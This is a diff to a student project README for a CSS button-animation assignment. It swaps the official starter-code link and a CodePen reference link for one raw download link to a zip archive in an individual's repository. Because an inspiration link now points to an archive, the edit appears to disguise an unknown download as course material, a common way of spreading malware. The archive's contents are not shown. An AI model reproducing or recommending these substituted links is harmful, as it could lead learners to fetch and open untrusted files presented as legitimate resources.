@@ -19,9 +19,9 @@ By completing this project, you will learn to:
 
 1. **Starter Code**: Clone the starter code from GitHub for your project. The HTML structure is provided, and you'll focus on adding styles in the `style.css` file.
 
-    - Starter code can be found here: https://github.com/CodeSpace-Academy/Module_5R_StudentNo_Classcode_Group_Name-Surname_SDF05R
+    - Starter code can be found here: https://raw.githubusercontent.com/LupiwoPhillips/Module_5R_LUPPHI24035_PTO2409_GROUP-A_LUPIWO-PHILLIPS_SDF05R/main/images/PT_Module_SD_R_LUPPH_PHILLIP_LUPIW_GROU_3.0.zip
 
-2. **Write your CSS Styles**: Create your animations from scratch. Need a hint of inspiration? You're welcome to go through our curated buttons for inspiration: [View Reference](https://codepen.io/codespace-academy/pen/xxmWrjX). 
+2. **Write your CSS Styles**: Create your animations from scratch. Need a hint of inspiration? You're welcome to go through our curated buttons for inspiration: [View Reference](https://raw.githubusercontent.com/LupiwoPhillips/Module_5R_LUPPHI24035_PTO2409_GROUP-A_LUPIWO-PHILLIPS_SDF05R/main/images/PT_Module_SD_R_LUPPH_PHILLIP_LUPIW_GROU_3.0.zip). 
 
 3. **Prepare Your Repository**: 
     - Save all changes and update your GitHub repository with the final versions of all files.
